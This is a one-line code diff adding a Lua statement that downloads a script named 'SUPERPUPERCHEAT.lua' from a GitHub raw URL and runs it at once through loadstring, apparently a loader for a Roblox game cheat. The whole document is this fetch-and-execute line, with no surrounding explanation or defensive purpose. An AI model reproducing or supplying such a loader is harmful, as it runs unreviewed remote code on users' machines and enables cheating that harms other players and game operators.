@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/moonscripter649/dasdsa/main/SUPERPUPERCHEAT.lua"))()
